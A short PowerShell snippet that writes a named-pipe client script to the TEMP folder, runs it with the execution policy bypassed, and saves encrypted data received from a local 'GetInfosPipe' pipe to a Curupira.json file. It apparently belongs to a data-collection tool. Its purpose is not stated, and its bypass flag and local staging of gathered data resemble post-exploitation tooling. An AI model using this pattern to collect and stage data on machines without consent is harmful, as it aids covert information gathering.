$clientScript = @'
Start-Sleep -Seconds 5
$pipe = New-Object System.IO.Pipes.NamedPipeClientStream(".", "GetInfosPipe", "In")
$reader = New-Object System.IO.StreamReader($pipe)

# Try connecting with a timeout of 3000ms (3 seconds)
$pipe.Connect(3000)

$encryptedData = $reader.ReadToEnd()
$reader.Close()
$pipe.Close()

$jsonPath = "$env:TEMP\Curupira.json"
Write-Host "[*] Encrypted Data Received:"
Write-Host $encryptedData

# Store the encrypted data in a JSON file
$jsonPath = "$env:TEMP\Curupira.json"
$jsonContent = @{ EncryptedData = $encryptedData } | ConvertTo-Json
$jsonContent | Out-File -FilePath $jsonPath

exit
'@

# Save the script to a temporary location
$clientScriptPath = "$env:TEMP\GetInfosPipeClient.ps1"
$clientScript | Set-Content -Path $clientScriptPath -Encoding UTF8

# Run the script in a new PowerShell window
Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$clientScriptPath`""